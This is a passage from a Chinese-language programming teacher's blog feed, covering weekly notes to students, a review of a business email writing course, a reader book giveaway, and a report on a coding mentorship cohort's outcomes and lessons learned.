怎麼設計架構，騰訊怎麼加強前端效能，看一看覺得：哇，我簡直看一篇文章就功力大增，知道得愈來愈多，但看久以後才發現我什麼都沒學會。</p><p>因為我沒有動手做，而且對於文章裡面講的那些，我也沒辦法做，因為離我太遙遠了。在寫程式這一塊動手做是很重要的，你沒辦法只靠看書或是看技術好文就增進你的技術，你必須自己跳下去實做，你才會更有感觸</p><p>別人寫的文章那是他實作完、解決問題完之後的總結，那只是他把技術消化過後吐出來的產物而已，對你的幫助很有限，自己動手做才是最重要的。</p><p>所以呢，如果你對一些東西有疑問，然後這些疑問又沒有這麼緊急且重要，不妨先開個記事本把這問題放著，等複習週再來研究，或搞不好課程跟著跟著之後就會講到了。</p><p>以上簡單提供三個我認為可以增進你跟課效率的小撇步，如果嘗試了之後不習慣，you can do it in your own way, it’s fine</p><p>Happy coding!</p><h4 id="第十三週"><a href="#第十三週" class="headerlink" title="第十三週"></a>第十三週</h4><p>yo 到了每週隨意聊的時間，在開始之前先講一些正經的（雖然其他也沒有不正經啦）。</p><p>第一是記得找時間跟我的 master 同步，我有更新了作業的一些描述（例如說 week11, 12 不會用到 $_SESSION 這東西），以及新增了作業檢討（就是我放在 examples 資料夾裡的東西），同步的話自己發 PR 自己 merge 就好，不用我 approve。</p><p>第二是請記得在作業寫完之後自己看作業檢討，在我改完前或是改完後去看都可以，但推薦是你寫完作業然後交作業之前就去看。</p><p>為什麼呢？因為你一定會在作業檢討上看到一堆你做錯或沒注意到的東西，而我在改作業的時候如果看到這些，通常我是不會特別點出來的。因為每個人在看作業檢討的時候就應該會看到這些然後自己修掉，所以我就沒必要再點出來一次了，這點請大家切記，要自己看然後自己修正，這真的超級重要，因為沒修掉的話你的作業就是漏洞百出 XDD</p><p>第三是大概講一下目前課程近況，學生共 54 人，前兩週都沒有淘汰人，進度的話大概六成的同學開始進入後端了，其餘四成還在跟前端奮戰，這週是第十三週，意思就是課程差不多進行到一半了（居然到一半了…）。</p><p>我有看到有些人好像卡關滿嚴重的，如果真的卡到懷疑人生，可以直接看看同學的 code 看看作業檢討之類的再回來做作業，不一定都要自己親手把作業寫出來。</p><p>好，跟課程相關的差不多是這樣。</p><p>接著先來分享一下這兩週在灣區的心得好了。有見了幾個朋友，在 Facebook 實習還有在 Google 實習的，我朋友講了一句話滿發人省思的：「在這邊最簡單的是寫 code」，最麻煩的就是一堆人的問題例如說跨部門溝通之類的，那些真的累人。</p><p>然後灣區的天氣真的很不錯，我有去了 Apple 訪客中心參觀，很弱，就是離總部比較近的 Apple Store，Google 園區也比想像中弱很多…後天要去的 Facebook 好像比較厲害，應該可以期待一下。</p><p>再來的話，這週其實主要想分享的是為什麼會有這個每週隨意聊。</p><p>我覺得身為一個教學者，自己有沒有在學習也是一件很重要的事，你必須同時是老師也是學生，才有可能當一個好老師，否則你無法同理。畢竟教跟學差很多，你教的時候會覺得自己什麼都講了，學的老師會發現老師怎麼都輕描淡寫帶過，能不能同理是一件很重要的事情。</p><p>身為一個自己偶爾也會學一下東西外加拖延症末期患者，我是很能夠同理拖延症患者的。我自己得到的心得是儘管有拖延症，還是會有一些時刻會讓你想要主動努力，就像「三分鐘熱度」一樣，如果你沒辦法解決這個問題，那就要學會與它共處。</p><p>怎麼共處？不是把時間延長（因為做不到），而是每隔三分鐘點燃一次就好，無論拖延再怎麼嚴重的人都還是會有主動的時刻，你要做的就是把握那個時機點。</p><p>那要怎麼點燃？以我自己的經歷，就是講一些勵志的東西哈哈，我自己很不喜歡心靈雞湯，但我也能漸漸理解為什麼很多人需要那種東西，自己沒有的東西只能往外去尋求，而心靈雞湯就補足了很多人沒有的那一塊。</p><p>有時候看完別人的一些故事，或者是看一些學習成功之後的心得感想，瞬間就會燃起那種：「哇！我也要繼續努力！」的感覺，在這之後的一段時間內就會比較有動力，有點像是加了油的那種感覺，就能夠繼續往前進。</p><p>但油也是會用光的，所以每隔一段時間就要加一下油，每週隨意聊大概就是扮演這樣的一個角色，希望大家看完之後有加到油的感覺，然後在這一週之內可以盡情燃燒。下一週沒油時又會有不同的內容，讓你再一次有著動力。</p><p>不過這樣太倚靠他人不是一件好事，希望大家能夠慢慢找到自己的動力來源<br>並且知道該怎麼幫自己補充動力。</p><p>喔對了因為美國待不慣而且沒車太不方便，我機票改早了，週六就會回到台灣了，就可以大吃一波臭豆腐滷味雞排鹹酥雞之類的。</p><p>happy eating! 喔不對，happy coding!</p><p>中集傳送門：&#x2F;2020&#x2F;01&#x2F;12&#x2F;weekly-note-part2-20fb2472d432&#x2F;</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CLN 新貴語文電郵寫作班心得（上）</title>
      <link href="/2019/12/23/cln-email-writing-part1-5262fcd9ff79/"/>
      <url>/2019/12/23/cln-email-writing-part1-5262fcd9ff79/</url>
      
        <content type="html"><![CDATA[<p>利益揭露：此課程為 CLN 邀請參與，但心得絕對真實。</p><p>今年十一月的時候報了這個 <a href="https://www.accupass.com/event/1911120132199708821210">CLN 的電郵寫作班</a>：</p><p><img src="/img/cln-email-writing-part1-5262fcd9ff79/1__mimKYGH2f7yU7RMOUSXV3Q.jpeg"></p><p>其實在這之前完全沒有聽過這間公司，後來查了一下，發現評價好像滿不錯的，除了電郵寫作班以外還有文法、口譯或是聽力等等的課程，看來十分全面。</p><p>先講一下為什麼會是電郵寫作班好了，其實那四個班我都滿想上的，但一來是時間的因素，二來是有關於寫 Email 這件事情我深深有感。</p><p>雖然說身為一個軟體工程師，與其他職位相比，在工作時會需要與他人溝通的機會已經少很多了，但還是有些時候會需要寫信與他人溝通。以下舉幾個例子：</p><h4 id="一、技術客服"><a href="#一、技術客服" class="headerlink" title="一、技術客服"></a>一、技術客服</h4><p>一般的公司不太可能東西都自己架，舉例來說，記錄錯誤可能會用 <a href="https://sentry.io/welcome/">Sentry</a>，主機放在 AWS，部署相關的流程放在 <a href="https://travis-ci.org/">Travis CI</a> 等等，這就是一些第三方提供的服務。</p><p>若是今天這些服務壞掉，或者是串接 API 時真的碰到問題卻解不開，該怎麼辦？當然就是寫信去問對方的技術客服，這時候要怎麼把問題表示清楚？要怎麼寫出一封看起來很有禮貌的 Email？</p><h4 id="二、跨部門溝通"><a href="#二、跨部門溝通" class="headerlink" title="二、跨部門溝通"></a>二、跨部門溝通</h4><p>直接舉個我以前工作上碰到的案例，因為網站大改版的關係，在 Google Analytics 上的數據出現一些斷層，例如說跳出率突然變低之類的（詳細原因跟改版有關，但在這邊不是重點就不多做說明了）。</p><p>其他部門的人發現以後就跑去問 PM，而 PM 就直接把那封來詢問的信轉寄給我，我就要直接回一封信解釋理由。這時候又會碰到一樣的問題了，你要怎麼解釋問題？要怎麼有禮貌的回信？</p><h4 id="三、工作日常瑣事"><a href="#三、工作日常瑣事" class="headerlink" title="三、工作日常瑣事"></a>三、工作日常瑣事</h4><p>你要請假，該怎麼請？請特休、事假跟病假，用的詞又有什麼不同？請病假的話那些病症怎麼說？</p><p>碰到問題想要建議公司，要怎麼建議？要用什麼樣的口吻才不會太過冒犯？</p><p>公司寄來 team outing 的邀請，但我不想去，要怎麼寫信回絕？</p><p>太多太多類似的情況都需要寫信，但重點還是在「該怎麼寫」。</p><h4 id="四、求職"><a href="#四、求職" class="headerlink" title="四、求職"></a>四、求職</h4><p>別說工作了，光是找工作其實就是一連串的寫信了。</p><p>要怎麼回覆面試邀請信，怎麼講自己有哪些有空的時間，怎麼表達感激，感謝剛剛的面試。拿到 offer 以後又要怎麼談薪水，怎麼談整個 package，想要拒絕 offer 的話怎樣拒絕才得體。</p><p>又是一大堆難解的問題。</p><p>對我來說，問題其實不在於表達，我自認為可以表達得清楚，我的問題在於我不知道要怎樣寫得比較正式而且比較禮貌。</p><p>總結一下我以前在 Email 寫作上碰到的問題：</p><ol><li>不知道怎樣講比較正式而且禮貌</li><li>不確定怎麼寫一些很固定的句子（例如說回絕、答應、表達感謝、請求等等）</li></ol><p>所以看到這個課程邀請的時候，沒有猶豫太久就決定要報名參加了。因為我是真的在寫英文 Email 上碰過很多問題，常常花了快一個小時只寫出一封短短的 Email。</p><h3 id="課程心得"><a href="#課程心得" class="headerlink" title="課程心得"></a>課程心得</h3><p>目前這個電郵寫作班第五堂課剛上完沒多久，一共有十堂課，所以這算是中場心得。在這篇心得裡面我會提及以下幾點：</p><ol><li>教學內容</li><li>教學風格</li><li>課堂氣氛</li></ol><h4 id="教學內容"><a href="#教學內容" class="headerlink" title="教學內容"></a>教學內容</h4><p>課程教材選用 Macmillan 出版社的 <a href="http://www.businessenglishonline.net/book/email-english/">Email English</a>，根據老師本人所述，他相當喜愛這份教材。喜愛的原因之一是裡面有很多內容都可以直接在工作或是生活上抄來用，簡直就是一大堆模板跟素材。</p><p>而教學就是跟著這本書在走，由老師帶著大家做其中的一些題目，然後留一些給小組討論，再留一些給回家作業。</p><p>直接舉一個例子大家可能比較有感覺，例如說其中一個單元叫做：Advice and suggestions，裡面的第一個練習給了兩封比較不正式的信，然後也給了你幾個比較正式的說法，要你將這兩個配對。</p><p>比如說 Any ideas? 比較正式的說法就是 I was wondering if you had any ideas.；或是比起 Please let me know what you think — email me or give me a call，你可以用 I would appreciate it if you could contact me to discuss this matter further。</p><p>書中就是充滿這樣的練習，讓你對 formal 以及 informal 的交替使用更有感覺，從這些練習裡面就可以得到很多固定的用法，而且會發現很多其實你都看過（尤其是在一些客服信之類的），例如說：</p><ol><li>To whom it may concern,</li><li>I will get back to you later.</li><li>I am writing to let you know that…</li><li>Please find attached my report.</li><li>I would be grateful if you could…</li></ol><p>這些都是學到以後可以直接拿來用的句子。其實我以前在收到英文信件的時候曾經有想要整理出來，但因為太懶惰而放棄。現在不用自己整理，直接看這本書就好。</p><p>若是課程只有這些，你可能會疑惑說那幹嘛不買書自己看就好。對，如果課程真的只有這些，買書自己看的成效應該也不會太差。</p><p>但這堂課不同的點在於除了這些 Email 寫作的東西以外，老師還會額外補充很多很多東西，包括單字、文法以及翻譯。</p><p>對，這不只是一堂 Email 寫作課，Email 寫作是主軸，但額外補充的東西絕對不亞於主軸本身。</p><p>舉例來說上面我提到的標題：Advice and suggestions，為什麼後者有加 s 前者沒有？因為前者是不可數名詞。那 advice、suggestion 跟 recommendation 差別又在哪裡？像這些也都會順便一起補充到。</p><p>那文法呢？處處都是文法啊！裡面出現的句子每一個都可以講解文法，光是時態那些就已經補充過很多遍了，只要是特別容易搞混或是需要注意的文法，老師都會補充。</p><p>而翻譯的地方相對於單字跟文法比較少提到，但還是滿有幫助的。例如說：Unfortunately, we have to inform you that your application has not been successful.，若是翻得不好會翻成：「不幸的，你的申請並沒有成功」，但比較正確的翻譯應該是「很遺憾的，你的申請並沒有成功」。</p><p>若是看到 Unfortunately 就膝跳反應般地翻成「不幸的」，那翻譯永遠不會進步。</p><p>總之呢，在課程上除了學習 Email 寫作以外，同時也在學習單字、文法以及翻譯。</p><h4 id="教學風格"><a href="#教學風格" class="headerlink" title="教學風格"></a>教學風格</h4><p>老師的教學風格滿活潑的，課程總共三個小時，但完全不會有想睡覺的感覺。這我覺得滿神奇的，以前大學上課一堂課一個小時，才上十幾分鐘就想睡覺，怎麼現在上課都不會想睡。</p><p>除此之外老師也滿幽默的，我常常都是邊上課邊笑。但幽默不是那種補習班老師式的刻意的幽默，而是本來就幽默，所以不用刻意也會讓人笑出來。</p><p>然後老師喜歡讓大家分組討論，所以都會有足夠時間的分組練習（一班大約 30 個人分五組，一組五到六人），通常是討論課本上的某些題目，或者是會出一些加分題幫我們補充。這些加分題通常也是那時候想到什麼就出什麼，不是特別準備好的。</p><p>例如說有一次上課提到感冒之類的，就考說那 SARS 的全名是什麼。又或是在上課時看到 Email 裡面寫著： in 2 days，就順便考說那 in 2 days、after 2 days 這兩個還有 before Friday、by Friday 這兩個有什麼不一樣。</p><h4 id="課堂氣氛"><a href="#課堂氣氛" class="headerlink" title="課堂氣氛"></a>課堂氣氛</h4><p>整體而言滿歡樂的，不會死氣沉沉。</p><p>第一是因為有分組討論嘛，所以分組討論的時候就會整個教室都在講話。而且因為分組討論都會有一個明確的主題，例如說討論這兩個用法對或錯之類的，所以也不用擔心需要跟組員尬聊。</p><p>第二前面有講過，老師滿幽默的，所以課堂上笑聲不斷。這整個課程都滿講求互動性的，也因為有這個互動性，讓課程變得比較有趣。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>上到目前為止我覺得課程還滿不錯的，除了學到 Email 寫作以外還學到了其他的東西，可以順便補充單字，還可以把從來沒搞懂過的文法再弄清楚一點（但我還沒完全搞懂就是了，因為我文法真的爛）。</p><p>這一篇是上集，主要就是分享一下課程在幹嘛、課堂上的狀況以及上到目前的心得，下集會在課程結業後（明年二月）推出，作為上完全部課程之後的總心得。</p><p>最後附上相關資料，有興趣的讀者們可以參考看看：</p><ol><li><a href="https://cln-asia.com/">CLN 官方網站</a></li><li><a href="https://www.accupass.com/event/1911120132199708821210">電郵寫作課程連結</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>為了感謝讀者的年末特別贈書活動</title>
      <link href="/2019/12/19/thanksgiving-event-873e0cd48833/"/>
      <url>/2019/12/19/thanksgiving-event-873e0cd48833/</url>
      
        <content type="html"><![CDATA[<p>在寫東西的過程當中，其實讀者一直是個很重要的因素。雖然說我覺得最好的情況是就算沒有人看也可以寫得很開心，但若是有人看而且被稱讚的話，那當然會更開心。</p><p>每次看到有人在文章下面留言稱讚我都會滿開心的，雖然我大多都只拍了幾下手而已並沒有回覆（因為也不知道回什麼，乾脆就不回了）。</p><p>很久以前有辦過一個「請我吃飯」的活動，好像沒有跟大家講後續。填表單的大概 35 人左右，但我一天只有早午晚三餐可以吃，而且許多人都只能約平日晚上或是假日，因此最後成功約出來的大概 10 個人。</p><p>從這些活動中，其實有時候滿驚訝自己的 Medium 居然真的這麼多人看。po 個請吃飯的文章還真的有人要請我吃飯，po 個想找家教的文章也真的有人填表單來報名。現在還是覺得滿不可思議的。</p><p>總之呢，很感謝所有讀者們的支持，也因為想實際做些什麼，所以才有了這個活動的想法。</p><p>簡單來說呢，這個活動就是要來贈書，不過跟一般的贈書活動不太一樣。許多贈書活動是因為受到出版社邀請，寫讀書心得外加贈書，但我平常本來就沒有在寫書評，所以從來沒有收到過這種邀請。</p><p>因此贈書的書都是我自己挑選外加購買的，這些書有可能是我看過覺得不錯的，也有可能是我一直想看但還沒看的。因為還沒去買書，所以我也還沒想好到底要送哪些書。</p><p>先打個預防針，你收到的書不一定是你想看的，這很正常，也有可能你已經有同一本書了。收到書以後你可以自己決定怎麼處理。你要賣掉、丟掉或是送人送二手書店都可以，給你了以後就是你的了。</p><p>會想要送書是因為在眾多禮物之中，除了錢以外，書應該是比較實用而且沒有風險的，也比較好處理，總比送一堆文具店買的不知所云的禮物還好。</p><p>好，那要怎麼樣才能「有機會」被贈書呢？</p><p><strong>寫信給我，裡面寫著你想對我說的話。</strong>如果不知道要說什麼，以下有幾個點是我想知道的，供您參考：</p><ol><li>是透過哪一篇文章知道我的？那時的感想如何？</li><li>最喜歡我的哪一篇文章？原因是什麼？</li><li>最討厭我的哪一篇文章？為什麼？</li><li>私心希望能夠看到更多哪方面的文章？</li><li>其他心得感想</li></ol><p>目前預計是送 5 本書啦，希望收到的信有超過這個數量（如果沒超過就是人人有獎，其實也不錯），然後這不是一個抽獎活動，所以最後被挑出來的人不是用抽的，是我選的。</p><p>那評選標準是什麼？抱歉，沒有一個公正公開的評選標準，就是挑幾個我比較喜歡的信出來贈書。不過身為一個很喜歡寫長文也很愛看長文的人，文長一般來說是有加分的，因為可以講得更細更多。寫不了那麼長也沒關係，只要完整地把自己想表達的盡量表達出來就好，長度不是唯一的評選標準。</p><p>現在年底了，會讓人開心的事情已經有很多了，例如說聖誕節跟跨年。所以這個活動的截止日就定在今年年底好了。在 <strong>2019-12-31 23:59</strong> 以前寄信都還來得及。這樣的話我可以在年初的時候寄書，又是一件令人開心的事。</p><p>信裡面先不用附上地址跟姓名，這樣透露太多個資了。截止以後我需要個幾天稍微想一下那 5 本書要送給誰，應該在 1&#x2F;6 以前會想好。若是你 1&#x2F;6 以前沒有收到我的回信跟你要地址與姓名，就代表很遺憾地沒有書可以拿，在這邊先說聲不好意思 QQ。</p><p>我的信箱是：<a href="mailto:&#x61;&#x73;&#122;&#x78;&#x38;&#x37;&#x34;&#49;&#48;&#64;&#103;&#109;&#x61;&#x69;&#108;&#46;&#99;&#111;&#109;">&#x61;&#x73;&#122;&#x78;&#x38;&#x37;&#x34;&#49;&#48;&#64;&#103;&#109;&#x61;&#x69;&#108;&#46;&#99;&#111;&#109;</a></p><p>信件的標題請打：Medium 贈書活動 — 暱稱<br>例如說：<strong>Medium 贈書活動 — huli</strong></p><p>若是你覺得用信件內文很難表達你想表達的或是很不順手，你要寫成 doc 檔、pdf 檔什麼的也都可以，但要記得附加檔案就是了。</p><p>大概就是這樣，希望我沒有遺漏什麼細節。如果有哪邊覺得不清楚的，麻煩再留言跟我說，感謝！</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>華麗謝幕：程式導師實驗計畫第三期成果以及未來走向</title>
      <link href="/2019/12/16/mentor-program-3rd-result-df178bb55f4/"/>
      <url>/2019/12/16/mentor-program-3rd-result-df178bb55f4/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/mentor-program-3rd-result-df178bb55f4/1__aXzbFu9____Bd7lFxHMaxWOw.jpeg"></p><p>為期八個月（六個月學習加兩個月找工作）的<a href="/2019/03/14/mentor-program-3rd-47a2e85e33b3/">程式導師實驗計畫第三期</a>在今天正式告一個段落。依照慣例，這一篇要來分享第三期的成果，還有未來改進的方向跟後續。</p><p>首先呢，針對第二期的改進之前已經寫過一篇分享（<a href="/2019/05/29/from-online-to-offline-bd99e545277a/">從線上到線下：第三期教學實驗滿月心得分享</a>），這邊就不再多說了。</p><p>接下來直接從第三期的成果開始好了。</p><h3 id="第三期成果"><a href="#第三期成果" class="headerlink" title="第三期成果"></a>第三期成果</h3><p>剛開始的時候一共有 62 個學生，到計畫結束的時候剩下 45 人，淘汰率大約為 27%。有些是被淘汰制淘汰的（兩週內每日心得累積缺交三次或是連續兩週未交作業），另外一些則是主動退出，原因有許多種，例如說跑去唸資工所、發現自己對工程師沒興趣或者是因病沒辦法繼續跟課等等。</p><p>45 人裡面有 6 人是工程師加強班，所以不列入最後求職的數據裡面。因此，會列入統計數據的學生一共有 39 人，底下是這些人的進度分佈：</p><p>21<del>24 週：18 人（9 人找到工作）<br>16</del>20 週：8 人（2 人找到工作）<br>11<del>15 週：6 人（3 人找到工作）<br>06</del>10 週：7 人</p><p>因此，總共有 14 人找到工作，轉職成功率約為 35%。</p><p>底下是薪水分佈的區間，含下不含上<br>例如說 30k~40k 就是 30k 以上未滿 40k：</p><p>30k<del>40k：3 人<br>40k</del>45k：4 人<br>45k~50k：5 人<br>50k 以上：2 人</p><p>可以發現高低差距滿明顯的，這跟上面的進度分佈有一點關係。這一期有個很特殊的狀況就是有些學生在比較早期的時候就找到了工作，那時的進度可能才在第十週左右，只會最最最基本的 HTML、CSS 跟 JavaScript，而公司認為可以訓練培養，所以薪水會拿得比較低一點。</p><p>以他們那時候的程度來說我覺得是合理的，也跟他們說記得滿三個月或一陣子之後跟主管要求調薪，能力上升了薪水自然要跟著調高。</p><p>而 50k 以上的人原本就已經有程式相關經驗，有的甚至已經有相關工作經驗，只是來我這邊把基礎再重新修煉一遍而已。</p><p>這 14 人的薪水中位數為 43.5k，平均數為 44k。</p><p>原本其實我預計轉職成功人數可以更多，進度在最前面的那 18 人其實都有機會，最後只有一半 9 人在計畫截止前找到工作。</p><p>剩下那 9 人有 2 人沒有求職意願，4 人正在求職，3 人狀況不明。</p><p>以上就是第三期關於轉職的成果報告，底下則是一些其他的產出。</p><h4 id="與學生合作專案"><a href="#與學生合作專案" class="headerlink" title="與學生合作專案"></a>與學生合作專案</h4><p>不知道大家有沒有看過一些玩遊戲學程式的網站？例如說 <a href="https://flexboxfroggy.com/">Flexbox Froggy</a> 或是六角學院的 <a href="https://hexschool.github.io/flexbox-pirate/index.html#/">Flex Private</a>，都是藉由有趣的小遊戲來學習特定概念。</p><p>這一期的課程我也做了兩個，第一個是：Lidemy HTTP Challenge，目的是想讓學生熟悉 HTTP 的相關操作以及概念，是純文字的，所以就算是用 curl 也可以順利遊玩。</p><p>第二個是異世界?r3:0 挑戰，是跟學生 <a href="https://medium.com/u/c7713dd3b6f6">Min</a> 合作的作品，關卡的 idea 主要是我出的，其他都交給學生來處理，最後做出了一個 MUD 風格的遊戲，裡面的題目都與網站前後端有關。</p><p>再來不太算遊戲，是 <a href="https://github.com/Lidemy/lazy-hackathon">Lazy Hackathon</a>，是與另外一名學生 <a href="https://medium.com/u/1b8faea10a91">Yakim Hsu</a> 合作的作品，我也只是大概提供了 idea，其餘實作皆由學生自行完成。就是故意做一個速度很慢的網站，讓大家想辦法去優化。</p><p>這一期出了以上三個我覺得滿好玩的專案，希望以後也能有更多類似的產出。</p><h4 id="課程筆記與心得"><a href="#課程筆記與心得" class="headerlink" title="課程筆記與心得"></a>課程筆記與心得</h4><p>這一期強烈建議大家做筆記，還建了一個 <a href="https://hackmd.io/15nAo8hkTaerrS6K8qNjaA?view">hackmd</a> 整理同學們記下來的筆記，加起來有一百多篇，內容都與課程所教的技術有關，然後課綱本來就滿廣的，所以他們記下來的筆記內容也很多元，有學到類似主題的朋友們可以參考看看。</p><p>除此之外，也寫出了一些不錯的文章，並不一定跟技術有關，底下稍微舉幾篇當作範例：</p><ol><li><a href="https://cianscribe.com/lidemy-mentor-program-first-review/">轉職網頁工程師最初的一段路  — — Lidemy 程式導師實驗計畫心得</a> by cian</li><li><a href="https://medium.com/@minw/%E8%A8%98%E5%9C%A8%E7%A8%8B%E5%BC%8F%E5%B0%8E%E5%B8%AB%E8%A8%88%E5%8A%83%E4%B9%8B%E5%BE%8C-%E4%B8%8B-%E6%B1%82%E8%81%B7%E5%A4%A9%E5%A0%82%E8%B7%AF-1dbf2f93de03">記在程式導師計劃之後（下）：求職天堂路</a> by minw</li><li><a href="https://medium.com/@ClayGao/%E8%AB%87%E8%AB%87%E6%88%91%E7%9A%84%E5%89%8D%E7%AB%AF%E5%AD%B8%E7%BF%92%E4%B9%8B%E8%B7%AF-aeb1cbe55e6a">淺談：我的前端學習之路</a> by ClayGao</li><li><a href="https://medium.com/@brad61517/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-%E5%AF%86%E7%A2%BC%E5%AD%98%E6%98%8E%E7%A2%BC-%E6%80%8E%E9%BA%BC%E4%B8%8D%E7%9B%B4%E6%8E%A5%E5%8E%BB%E8%A3%B8%E5%A5%94%E7%AE%97%E4%BA%86-%E6%B7%BA%E8%AB%87-hash-%E7%94%A8%E9%9B%9C%E6%B9%8A%E4%BF%9D%E8%AD%B7%E5%AF%86%E7%A2%BC-d561ad2a7d84">[資訊安全] 密碼存明碼，怎麼不直接去裸奔算了？淺談 Hash , 用雜湊保護密碼</a> by CodingCoke</li><li><a href="https://medium.com/@hugh_Program_learning_diary_Js/%E5%89%8D%E7%AB%AF%E4%B8%AD%E9%9A%8E%E4%BD%9C%E6%A5%AD-event-loop-scope-hoisting-closure-ffa02ed722fb">前端中階作業：event loop、Scope、hoisting、closure</a> by hugh</li><li><a href="https://yakimhsu.com/project/project_w21_01_React_environment_setup.html">[第二十一週] React 環境建置：手把手步驟 &amp; 超級懶人包</a> by yakim</li></ol><p>課程雖然結束了，但這些筆記與文章會留下，等到哪天再次碰到以前曾經解過的問題，卻忘記當初怎麼解，這些筆記就是最好的解答，看一下就可以喚回記憶。</p><h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><p>接著是這一期教完的一些反思，跟上一期比起來，會在意更「底層」的問題。</p><h4 id="想要教出什麼樣的學生？"><a href="#想要教出什麼樣的學生？" class="headerlink" title="想要教出什麼樣的學生？"></a>想要教出什麼樣的學生？</h4><p>在計畫一開始的時候，我就把目標說得很明確了：</p><blockquote><p>希望能在結業時培養出合格的（意思就是找得到工作）的工程師，並且在就職後依舊能持續成長，成為好的工程師。</p></blockquote><p>而計劃的收費方式也是根據「成功求職」而定，因此可以認為這一堂課的目標就是要教出找得到工作的學生。當初會這樣定是因為我覺得這是個不錯的標準，能找得到工作就代表有一定的實力。</p><p>但從這一期的狀況看來，我覺得「求職」這個標準不管用了，因為現在的求職門檻比我想像中的還要低。似乎因為職缺太多的關係，門檻也跟著變低了。儘管最近幾年轉職的人很多，但我覺得門檻沒有跟著提高，對於新手工程師似乎還是供不應求。</p><p>那如果不以求職為標準，要用什麼為標準呢？例如說想培養出「基礎紮實」的工程師？</p><h4 id="怎樣才叫做「基礎紮實」？"><a href="#怎樣才叫做「基礎紮實」？" class="headerlink" title="怎樣才叫做「基礎紮實」？"></a>怎樣才叫做「基礎紮實」？</h4><p>我後來發現在我的定義裡面，基礎紮實這件事情其實很難達成，難的點就在於它是一個很容易被攻破的東西。假設今天我認為的基礎有 100 個這麼多，只要缺了一個，我就沒辦法覺得這個人基礎紮實。</p><p>舉個例子好了，假設有一個人關於 this、closure、event loop、prototype 這些經典的 JavaScript 問題都回答得很好，結果我問他：「變數跟常數的區別是什麼」，他卻回答不出來；或者是他居然不知道二維陣列是什麼，儘管會的很多，但還是會因為他不知道這些「我認為的基礎」，沒辦法把他當作是個基礎紮實的人。</p><p>所以對我來說這不是算分數，不是 100 個裡面會了 99 個就可以，而是要 100 個全部都會，只要少了任何一個都不行。</p><p>但這樣子的判定方式會碰到的難題是，在教學的時候只要漏掉任何一個基礎沒有教，教出來的學生就會被我自己認為基礎不紮實。</p><p>再來還有一個問題，讓我反思自己的課程是不是太著重在工具層面上。我原本就有特別小心這一塊，當初在設計課綱時我的目標是必須要讓學生知道工具的原理以及使用，才不會只學到表象，才能不役於物。</p><p>但實際情況是雖然那些工具的原理以及使用學生們都懂了，但對於一些我認為是基礎的問題卻沒辦法解出來，或者可以解出來，但解的方法很不「直觀」。</p><p>直接舉一題實際的例子，HackerRank 上面的一個題目叫做：<a href="https://www.hackerrank.com/challenges/sock-merchant/problem">Sock Merchant</a>，給你一個陣列像是 [1, 2, 2, 4, 5, 2, 4]，每一個數字代表一個編號的襪子，問你總共有幾雙襪子。</p><p>以上面的陣列來說，答案是兩雙（2, 4 各一雙）。這一題對我來說非常直觀，給了一個 O(n) 的解法（但會用到額外空間）。可是對有些同學來說，他們的「直觀」是 O(n²) 的解法，而且想不到 O(n) 解。</p><p>上面這個例子其實有討論空間，不過這只是其中一個案例而已，我可以舉出更多更多更基本的題目，例如說找質數、判斷質數或者是印出聖誕樹等等，這些題目就又更基本了，但卻依然有些學生沒辦法解出來。</p><p>我認為這樣子的成果在教學上，是有點本末倒置的。因為這代表在工作上實作商業邏輯時，很有可能會繞了一圈來實作，導致程式碼變得很複雜，我覺得這是比「不會用工具」還更嚴重的事情。寫到這邊突然可以理解為什麼有些公司面試的時候要考演算法了。</p><p>課程上對於前端的工具使用以及「前端的基礎」我自認教得還行，但我卻忽略了更底層的<strong>「程式的基礎」</strong>。就像一個金字塔那樣，我教了上層卻忽略了下層，如果本來就有基礎的同學，在我的課程學完前端基礎以後如虎添翼；但若是本來沒基礎而且也沒有特別訓練過，就算學完前端基礎，我也不會認為是個合格的工程師。</p><p>這讓我認真思考是不是之後要來嘗試看看新的模式，新的模式幾乎不教工具也不教前端，就一直練習這些「水題」（對工程師來說寫起來像吃飯喝水般簡單的題目），培養程式思維。</p><p>除了練習程式解題以外，也會一直寫 code，寫一大堆小工具，例如說可以用 Node.js 寫個簡單的記事本啦，爬蟲啦，chatbot 啦，寫一大堆的專案培養 coding 能力。</p><p>結業的時候雖然可能不太懂前後端，也不知道什麼是 React 什麼是 Redux，但至少對寫 code 是有自信的。仔細想了一下，發現這其實就是我自己走來的歷程，先瘋狂地寫 code，寫一大堆小東西出來，先確認自己會寫 code，再來學其他東西。</p><h4 id="作業規模過小"><a href="#作業規模過小" class="headerlink" title="作業規模過小"></a>作業規模過小</h4><p>第二期就有發現這個問題，但第三期並沒有完全修正過來，雖然有加了「挑戰題」這個東西，但其實改善成效滿有限的。</p><p>我出作業的時候是以一個簡單的 MVP 為目的在出的，所以留言板就是可以留言就好，blog 就是可以發文就好，就只要這麼簡單就可以了，但我後來發現這樣是不行的。</p><p>我之所以會把規模縮小，是因為我知道完整的專案長怎樣，而原理其實都在這個「縮小版專案」裡面，只要能實作出縮小版，完整的專案就不會太難。</p><p>可是對學生而言，他們做小的專案就只知道縮小版長什麼樣子。那些大專案不是因為能力問題而寫不出來，只是不知道怎麼開始，或是不知道怎樣才算是「大」。他們不像我一樣有經驗，所以完全想像不到完整的專案的面貌，這是因為經驗上的落差導致的教學失誤。</p><p>比較好的調整方式是加大作業規模，同時也加大我在上課時示範的專案規模。例如說比留言板跟部落格再複雜一點的論壇之類的，或是也可以實作出一個電商網站。總之複雜度必須要比之前高很多，才能讓學生看到一個更完整的專案會長什麼樣子。</p><h4 id="「缺點」"><a href="#「缺點」" class="headerlink" 